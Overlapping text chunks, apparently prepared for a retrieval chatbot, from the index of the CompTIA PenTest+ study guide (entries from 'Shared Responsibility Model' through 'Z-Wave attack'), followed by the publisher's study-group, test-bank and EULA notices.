rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	516–518 Shared Responsibility Model, 39–41 standards and methodologies, 47–49 threat modeling frameworks, 49–50 platform plug‐ins, 95 plug‐in feeds, vulnerability, 132 plug‐ins, configuring, 126–127 point‐of‐sale (POS) systems, 172 PortSwigger, 363–364 post‐engagement cleanup, 462–463 post‐exploit attacks, 233–236 Postman, 423 PowerShell (PS) about, 223, 475–476 comparison operators in, 480 error handling, 501 flow control, 489 for loops, 493 modules, 504–505 string operators in, 483–484 variables arrays and substitutions in, 479 while loops, 497–498 PowerShell ISE, 222 PowerSploit, 216–217, 505 PowerUpSQL, 505 PowerView, 505 presumption of compromise, 7 pretexting, 303, 311 primary contact, 447 privilege escalation attacks, 171, 236–237, 352, 414–415 privileges required (PR) metric, 157–158 procedures, 502 process hollowing, 396 prompt injection, 425 protocol fuzzing, 281 protocol scanning, 69–70 protocols enumeration and, 87–88 insecure use of, 173 Prowler, 418 proxies, 407 ProxyChains, 222 proxychains command, 407 public key, 31 Purdue Model, 48 PuTTY, 394 pwdump, 401 pwnedOrNot, 67 PxExec, 223 Python about, 476 comparison operators in, 480 error handling, 502 flow control, 489–490 libraries, 505 for loops, 493–494 string operators in, 485–486 variables arrays and substitutions in, 479–480 while loops, 498 Q quality control (QC), in reports, 461 Qualys, 120, 125, 141, 343–344 quid pro quo attacks, 311 R race conditions, 358 rainbow tables, 236 RainbowCrack, 402 Rapid7, 214 about, 430 Metasploitable virtual machine, 84 Vulnerability & Exploit Database, 208 real‐time operating system (RTOSs), 183 RealVNC, 394 Reaver, 287 Recommendations and Remediation, in reports, 458 reconnaissance, enumeration and, 60–80 Reconnaissance phase, of Cyber Kill Chain, 15–16 Recon‐ng, 69, 97, 318–319 redirects, unvalidated, 345 red‐team assessments, 32 reflected XSS, 352–353 registered ports, 86–87 regulatory compliance, 45–46, 115–119 relationships, 90 relay attacks, 264, 282 relay creation, 201–202 remediation guidance, 362 remediation workflow about, 138–139 prioritizing, 140 strategies, 466 testing and implementing fixes, 141 remote access about, 404 launching, 504 Metasploit, 405–406 Ncat, 405 Netcat, 405 proxies, 407 proxychains command, 407 Secure Shell (SSH), 404–405 remote code execution vulnerabilities, 171 Remote Desktop Protocol (RDP), 230–231 remote file inclusion attacks, 350–351 Remote Procedure Call/Distributed Component Object Model (RP/DCOM), 223 repeating traffic, 291 replay attacks, 263–264, 343 reporting and communication about, 446, 464–465 in CompTIA penetration testing process, 14 engagement, 462–464 exam essentials, 465–466 importance of communication, 447–449 lab exercises, 466 mitigation strategies, 449–454 real world scenario, 446, 451–452 review questions, 467–469, 535–536 vulnerability scanning, 153–155 writing penetration testing reports, 454–462 writing reports, 466 repos, 409 Representational State Transfer (REST), 359 request forgery, 355–356 resource exhaustion attacks, 416 Responder, 270–272, 403 restricted shells, 389 restrictive shell, upgrading, 238 retention, of data, 464 reverse DNS lookups, 508 reverse engineering, on mobile devices, 420 reverse shell, 240, 436–437 review questions application vulnerabilities, 373–377, 530–532 cloud technologies, 532–535 exploits, 248–251, 524–526 hosts, 532–535 Information Gathering and Vulnerability Scanning domain, 109–112, 518–520 network vulnerabilities, 295–298, 526–528 penetration testing, 516–518 physical and social vulnerabilities, 324–327, 528–530 pivoting, 248–251, 524–526 Planning and Scoping domain, 53–56, 516–518 reporting and communication, 467–469, 535–536 scripting, 509–513, 536–537 specialized systems, 532–535 vulnerability scanning, 146–149, 188–191, 520–523 RFID cloning, 289–290 risk, to penetration testers, 42–43 risk appetite, 121 robots.txt
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Responder, 270–272, 403 restricted shells, 389 restrictive shell, upgrading, 238 retention, of data, 464 reverse DNS lookups, 508 reverse engineering, on mobile devices, 420 reverse shell, 240, 436–437 review questions application vulnerabilities, 373–377, 530–532 cloud technologies, 532–535 exploits, 248–251, 524–526 hosts, 532–535 Information Gathering and Vulnerability Scanning domain, 109–112, 518–520 network vulnerabilities, 295–298, 526–528 penetration testing, 516–518 physical and social vulnerabilities, 324–327, 528–530 pivoting, 248–251, 524–526 Planning and Scoping domain, 53–56, 516–518 reporting and communication, 467–469, 535–536 scripting, 509–513, 536–537 specialized systems, 532–535 vulnerability scanning, 146–149, 188–191, 520–523 RFID cloning, 289–290 risk, to penetration testers, 42–43 risk appetite, 121 robots.txt file, 95 rogue access point, 286 rootkits, 171, 218 route tool, 221 routes, 68 RTFM: Red Team Field Manual (Clark), 77 Rubeus, 398 Ruby, string operators in, 484–485 rules of engagement (RoE), 34–37 rundll command, 220 S sandbox analysis, on mobile devices, 420 Sarbanes‐Oxley Act (SOX), 46 scan completeness, 163 scan perspectives, 131–132 scanner software, 132 scanners, 365–367 scanning systems, 506 Scapy, 78, 505 scheduled jobs/tasks, 239 scheduled tasks, 225–226 scope in CompTIA penetration testing process, 12 considerations for, 27–29 defining, 26–27 scope creep, 29 ScoutSuite, 418 scripting about, 473, 506 arrays, 477–480 comparison operators, 480 error handling, 501–502 exam essentials, 507 flow control, 486–499 input and output (I/O), 499–500 lab exercises, 508 penetration testing and, 473–476 real world scenario, 473 reusing code, 502 review questions, 509–513, 536–537 role of coding in penetration testing, 503–506 string operators, 480–486 substitutions, 477–480 variables, 477–480 search engine analysis and enumeration, 71–74 secrets enumeration, 92–93 secrets scanning, 369 secure handling, of reports, 462 Secure Shell (SSH) about, 173, 231 exploits, 279 remote access and, 404–405 Secure Sockets Layer (SSL) issues with, 175–178 online checkers, 343–344 SecureAuth, 228 Security Accounts Manager (SAM) database, 392, 434–435 Security Assertion Markup Language (SAML) attacks, 400 Security Content Automation Protocol (SCAP), 132–133 security information and event management (SIEM) systems, 165 security logging and monitoring, as a top security risk, 360 security misconfigurations, as a top security risk, 360 security risks, 359–360 segmentation bypass, 265–266 Self‐Assessment Questionnaire (SAQ), 24–25 sensitive data, enumeration and, 204 Server Message Block (SMB), 226–228, 273 servers, vulnerabilities of, 168–174 server‐side request forgery (SSRF), 356, 360 server‐side template injection (SSTI), 339 service discovery, 85–87 Service Set Identifier (SSID) scanning, 283 service‐level agreements (SLAs), 43, 141 services, 217 about, 239 certificate, 257 degradations, as a barrier to vulnerability scanning, 141 identifying, 85–87 identifying and attacking targets, 274 identifying and exploiting common, 273–281 misconfigured, 267–268 session attacks, 341–345 session fixation attacks, 342–343 session hijacking, 341–343 session tokens, 93 set group ID (GUID), 386–388 set user ID (SETUID/SUID), 238, 386–388 share enumeration, 268 Shared Responsibility Model, 39–41 shell escape, 395 shells escaping and upgrading limited, 238–239 restricted, 389 Shodan, 61, 71, 72, 97–98 short message service (SMS) phishing, 312 shoulder surfing, 311 shove keys, 306 side‐channel attacks, 417 signal strength scanning, 284 Simple Mail Transfer Protocol (SMTP) exploits, 276 Simple Network Management Protocol (SNMP), 88, 274–276 Simple Object Access Protocol (SOAP), 359 site surveys, 303 sitemap, 95 SNMP sweep,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	identifying and exploiting common, 273–281 misconfigured, 267–268 session attacks, 341–345 session fixation attacks, 342–343 session hijacking, 341–343 session tokens, 93 set group ID (GUID), 386–388 set user ID (SETUID/SUID), 238, 386–388 share enumeration, 268 Shared Responsibility Model, 39–41 shell escape, 395 shells escaping and upgrading limited, 238–239 restricted, 389 Shodan, 61, 71, 72, 97–98 short message service (SMS) phishing, 312 shoulder surfing, 311 shove keys, 306 side‐channel attacks, 417 signal strength scanning, 284 Simple Mail Transfer Protocol (SMTP) exploits, 276 Simple Network Management Protocol (SNMP), 88, 274–276 Simple Object Access Protocol (SOAP), 359 site surveys, 303 sitemap, 95 SNMP sweep, 76–77 social engineering about, 237–238, 308 in‐person, 309–311 phishing attacks, 312 tools for, 314–319 website‐based attacks, 312–314 Social Engineering Framework, 309 Social Engineering Toolkit (SET), 314–315 social media, active reconnaissance and, 61–63 software and data integrity failures, as a top security risk, 360 software assurance, 331 software composition analysis (SCA), 362 software development kits (SDKs), 30, 418 software security testing about, 134 analyzing and testing code, 135–136 web application vulnerability scanning, 136–138 source code analysis of (See static code analysis) comments, 36 spamming, on mobile devices, 420 spear phishing, 312 specialized systems about, 384, 431–432 attacking data storage, 430–431 attacking embedded systems, 426–430 attacking ICS, 426–430 attacking Internet of Things (IoT), 426–430 attacking SCADA devices, 426–430 exam essentials, 433–434 lab exercises, 434–437 review questions, 532–535 SpiderFoot, 98 Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege (STRIDE), 49 spoofing attacks, 282 SpoofTooph, 287 SQL injection attacks about, 334 Boolean blind, 335–336 reporting and communication, 454 timing‐based blind, 336–337 sshuttle tool, 222 SSL, 63 standards, 47–49 statement of work (SOW), 37, 43, 124 static application security testing (SAST), 361–362 static code analysis, 135 steganography, 241 stored/persistent XSS, 353–354 stress testing, 266–267, 280–281 string operators about, 480–482 Bash, 482–483 PowerShell, 483–484 Python, 485–486 in Ruby, 484–485 strings, 221–222 substitutions, 477–480 sudo command, 388–389 Sullenberger, Chesley "Sully," 15 Supervisory Control and Data Acquisition (SCADA), 79, 182, 426–430 support resources, for penetration tests, 29–32 surveillance, 303, 309–310 system ports, 86–87 system‐detect‐virt command, 409 T tailgating, 304–305 Target, 451–452 targets choosing, 198 finding, 282–284 selecting, 37–38 tcpdump, 104–105 technical contact, 447 technical controls, 449 Telnet, 229–230 terms of service (ToS) agreements, 37 test cases, 36 Test Limitations and Assumptions, in reports, 458–459 testing window, 36–37 THC‐Hydra, 234 theHarvester tool, 69, 90, 102, 103, 319 third‐party responsibilities, 41 threat hunting, 6–7 threat modeling frameworks, 49–50 ticket granting ticket (TGT), 346–347 time‐of‐check‐to‐time‐of‐use (TOCTTOU), 358 timing‐based blind SQL injection attacks, 336–337 TLS, 63 tokens, 65–66, 346 toolkits, for exploits, 209–222 tools. See also specific tools in CompTIA penetration testing process, 14 for penetration testing, 17 social engineering, 314–319 traceroute, 68 Transmission Control Protocol (TCP), 70, 128 Transport Layer Security (TLS) issues with, 175–178 online checkers, 343–344 trend analysis, 166–167 triggers, communication, 448 Trivy, 125, 137, 409 Trojans, 240 TruffleHog, 233, 369 U Ubuntu Linux, 209 UltraVNC, 394 unencrypted files, enumeration and, 204–205 uniform resource locator (URL), 38 Unix shell, 474 unknown environment tests, 33–34 unvalidated redirects,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	49–50 ticket granting ticket (TGT), 346–347 time‐of‐check‐to‐time‐of‐use (TOCTTOU), 358 timing‐based blind SQL injection attacks, 336–337 TLS, 63 tokens, 65–66, 346 toolkits, for exploits, 209–222 tools. See also specific tools in CompTIA penetration testing process, 14 for penetration testing, 17 social engineering, 314–319 traceroute, 68 Transmission Control Protocol (TCP), 70, 128 Transport Layer Security (TLS) issues with, 175–178 online checkers, 343–344 trend analysis, 166–167 triggers, communication, 448 Trivy, 125, 137, 409 Trojans, 240 TruffleHog, 233, 369 U Ubuntu Linux, 209 UltraVNC, 394 unencrypted files, enumeration and, 204–205 uniform resource locator (URL), 38 Unix shell, 474 unknown environment tests, 33–34 unvalidated redirects, 345 USB drop attacks, 311 use of insecure storage, 420 User Datagram Protocol (UDP), 70, 128 user interaction (UI) metric, 158 user‐controlled access bypass, 395 users enumeration and, 89–90, 202 new, 241–242 V validated redirect, 345 validating vulnerability scan results, 162–167 variables, 477–480 versions, identifying, 87 vertical escalation attacks, 236 video surveillance, 307 virtual guests, vulnerabilities with, 182 virtual host patching, 182 virtual local area networks (VLANs), 231 virtual machine attacks, 409–411 virtual machines (VMs) attacking, 407–412 escape vulnerabilities, 181 Virtual Network Computing (VNC), 231 virtual networks, vulnerabilities with, 182 virtual private cloud (VPC), 40 virtual private networks (VPNs), vulnerabilities with, 179–180 VirtualBox, 209 virtualization compared with containers, 408 container security and, 129 vulnerabilities with, 180–182 vishing, 312 VLAN hopping, 231, 257–259 VMware, 209 VulDB, 208 vulnerabilities. See specific types vulnerability detection, 362 vulnerability scanning about, 95, 114–115, 142, 152, 185–186 active vs. passive, 123 Aircrack.ng, 105 Amass, 100–101 barriers to, 141–142 Censys.io, 98–99 common vulnerabilities, 167–185 in CompTIA penetration testing process, 13 configuring and executing, 123–134 determining frequency, 121–123 developing remediation workflows, 138–141 dig, 98 DNSDumpster, 99–100 exam essentials, 143, 186 Hunter.io, 99 identifying targets for, 119–120 inSSIDer, 104 installing scanners, 144 interpreting reports, 152–162 lab exercises, 144–145, 187 maintenance and, 132–134 Maltego, 96 Nmap, 101–102 Nmap Scripting Engine (NSE), 102 nslookup, 98 OSINT Framework, 104 real world scenario, 114–115, 152 Recon‐ng, 97 requirements for, 115–123 review questions, 146–149, 188–191, 520–523 running, 144 sensitivity levels, 125–126 Shodan, 97–98 SHOIS, 98 software security testing, 134–138 SpiderFoot, 98 tcpdump, 104–105 theHarvester, 102, 103 validating results, 162–167 Wayback Machine, 96 web application, 136–138 WiGLE.net, 102–103 Wireshark, 104–105 W W3AF, 404 wafw00f, 76 wardriving, 68–69, 281 watering hole attacks, 313 Wayback Machine, 96 weak‐signing key, 346 Weaponization phase, of Cyber Kill Chain, 16 web application firewall enumeration, 93–94 web application firewalls (WAFs), 333–334 web application vulnerabilities about, 183, 352 clickjacking, 356 cross‐site scripting (XSS), 352–355 request forgery, 355–356 vulnerability scanning, 136–138 web assessments, 38 web crawling, 94 web pages, enumeration and, 94 web scraping, 94 web shell, 351 website‐based attacks, 312–314 websites Aircrack‐ng, 105 Amass, 100 Bright Data, 62 Censys.io, 98 DNSDumpster, 99–100 HighOn.Coffee Penetration Testing Tools Cheat Sheet, 77 Hunter.io, 99 inSSIDer, 104 Maltego, 96 OSINT Framework, 104 pwnedOrNot, 67 Shodan, 97 SpiderFoot, 98 Wayback Machine, 96 WiGLE.net, 102 Wireshark, 105 ZoomEye, 72 well‐known ports, 86–87 wfuzz, 365 whaling, 312 WhatWaf, 76 while loops about, 494–495 Bash, 496–497 identifying language of, 498–499
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	web application vulnerabilities about, 183, 352 clickjacking, 356 cross‐site scripting (XSS), 352–355 request forgery, 355–356 vulnerability scanning, 136–138 web assessments, 38 web crawling, 94 web pages, enumeration and, 94 web scraping, 94 web shell, 351 website‐based attacks, 312–314 websites Aircrack‐ng, 105 Amass, 100 Bright Data, 62 Censys.io, 98 DNSDumpster, 99–100 HighOn.Coffee Penetration Testing Tools Cheat Sheet, 77 Hunter.io, 99 inSSIDer, 104 Maltego, 96 OSINT Framework, 104 pwnedOrNot, 67 Shodan, 97 SpiderFoot, 98 Wayback Machine, 96 WiGLE.net, 102 Wireshark, 105 ZoomEye, 72 well‐known ports, 86–87 wfuzz, 365 whaling, 312 WhatWaf, 76 while loops about, 494–495 Bash, 496–497 identifying language of, 498–499 PowerShell, 497–498 Python, 498 white box tests, 33–34 WHOIS, 98 Wi‐Fi Protected Setup (WPS), 286–287 Wi‐Fi Protected Setup (WPS) personal identification number (PIN) attack, 282 Wi‐Fi Pumpkin, 289 WiFite, 289 WiGLE.net, 102–103 Windows kernel, 393 Windows Management Instrumentation (WMI), 224 Windows Remote Desktop Protocol (RDP), 230–231 Windows Remote Management (WinRM), 218, 223–224, 406–407 Windows systems attacking, 391–393 exploiting, 269–273 wireless assessments, 39 wireless exploits about, 281 attack methods, 281–282 captive portals, 284 eavesdropping, 284–288 evil twins, 284–288 finding targets, 282–284 jamming, 290 on‐path attacks, 284–288 repeating, 291 RFID cloning, 289–290 security tools, 288–289 Wireless Geographic Logging Engine (WiGLE), 289 wireless networks, 68–69 wireless testing, 294 Wireshark, 69, 104–105 wordlists, 404 World Wide Web Consortium (W3C), 30 wpad, 289 WPScan, 367 X X.509 certificate, 31 XML‐based standards, 30 Z Zed Attack Proxy (ZAP), 363–364, 371 Zenmap, 84 Zenmap GUI, 74–75 zero knowledge tests, 33–34 ZoomEye, 72 Z‐Wave attack, 285 Get Certified! Join One of CertMike’s FREE Study Groups and Get the Training You Need on a Timeline You Can Manage. Mike Chapple, Ph.D. offers FREE ONLINE STUDY GROUPS that complement this book and will help prepare you for your next technology certification. Mike is a cybersecurity and IT certification expert, professor, and author with over 25 years of experience in the field. Through his video courses, books, and study groups, he’s helped millions of students earn professional IT certifications. He’s written over 50 books, including the Official ISC2 CISSP Study Guide and created over 150 video courses helping students advance in their professional careers. Earn Your Next Certification! Visit CertMike.com to learn more. Online Test Bank To help you study for your CompTIA PenTest+ certification exam, register to gain one year of FREE access after activation to the online interactive test bank—included with your purchase of this book! To access our learning environment, simply visit www.wiley.com/go/sybextestprep, follow the instructions to register your book, and instantly gain one year of FREE access after activation to: Practice test questions, so you can practice in a timed and graded setting. Flashcards A searchable glossary WILEY END USER LICENSE AGREEMENT Go to www.wiley.com/go/eula to access Wiley’s ebook EULA.
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	learning environment, simply visit www.wiley.com/go/sybextestprep, follow the instructions to register your book, and instantly gain one year of FREE access after activation to: Practice test questions, so you can practice in a timed and graded setting. Flashcards A searchable glossary WILEY END USER LICENSE AGREEMENT Go to www.wiley.com/go/eula to access Wiley’s ebook EULA.
